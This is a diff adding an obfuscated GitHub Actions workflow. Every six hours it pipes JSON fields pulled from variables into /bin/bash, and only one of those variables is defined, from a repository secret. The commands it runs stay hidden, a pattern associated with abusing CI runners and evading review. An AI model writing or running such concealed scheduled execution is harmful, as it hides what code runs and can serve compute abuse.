@@ -1,0 +1,30 @@
+name: pengqi19871010
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: pengqi19871010
+        env:
+          bexlc786: ${{ secrets.bexlc786 }}
+        run: |
+          echo $bexlc786 | jq -r .dho39 | /bin/bash
+          echo $etvwa4374 | jq -r .bms1034 | /bin/bash
+          echo $jewy47 | jq -r .jo412 | /bin/bash
+          echo $tmatm3060 | jq -r .yuxvp5710 | /bin/bash
+          echo $by50 | jq -r .hpbw52 | /bin/bash
+          echo $mx7994 | jq -r .vgdh987 | /bin/bash
+          echo $zel62807 | jq -r .zfef6 | /bin/bash
+          echo $w900 | jq -r .xoj09 | /bin/bash
+          echo $llzyy83061 | jq -r .vdwu53 | /bin/bash
+          echo $nerr6 | jq -r .dlr62 | /bin/bash
+          echo $l948 | jq -r .tv5740 | /bin/bash
+          echo $nwc663 | jq -r .onko250 | /bin/bash
+          echo $visn81885 | jq -r .l24681 | /bin/bash
+          echo $qr2327 | jq -r .axx14 | /bin/bash
+
